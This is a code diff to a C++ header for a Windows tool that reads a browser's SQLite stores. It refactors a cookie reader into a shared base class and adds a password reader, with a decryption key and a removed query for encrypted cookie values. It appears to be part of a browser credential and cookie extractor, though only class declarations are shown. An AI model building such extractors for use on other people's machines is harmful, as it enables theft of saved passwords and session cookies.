@@ -9,9 +9,6 @@
 
 using std::vector;
 using std::string;
-namespace queries {
-	static LPCSTR cookies = "SELECT name, host_key, path, encrypted_value FROM cookies";
-}
 
 struct CookieEntry {
 	string name;
@@ -20,17 +17,23 @@ struct CookieEntry {
 	string cookie;
 };
 
-class CookieReader {
+struct PasswordEntry {
+	string name;
+	string site;
+	string password;
+};
+
+
+class ContentReader {
 public:
 	LPCSTR filePath;
 	sqlite3* database;
 	sqlite3_stmt* statement;
 
 	PBYTE key;
-	vector<CookieEntry*> cookies;
 
-	CookieReader(LPCSTR filePath, PBYTE key) : filePath(filePath), key(key), database(NULL), statement(NULL) {};
-	~CookieReader();
+	ContentReader(LPCSTR filePath, PBYTE key) : filePath(filePath), key(key), database(NULL), statement(NULL) {};
+	~ContentReader();
 
 	BOOL isLocked();
 	BOOL initSqliteDb();
@@ -46,6 +49,22 @@ public:
 		return (T)sqlite3_column_blob(this->statement, colIndex);
 	}
 
+};
+
+class CookieReader : public ContentReader {
+public:
+	vector<CookieEntry*> cookies;
 	void populateCookies();
 
+	using ContentReader::ContentReader;
+	~CookieReader();
+};
+
+class PasswordReader : public ContentReader {
+public:
+	vector<PasswordEntry*> passwords;
+	void populatePasswords();
+
+	using ContentReader::ContentReader;
+	~PasswordReader();
 };
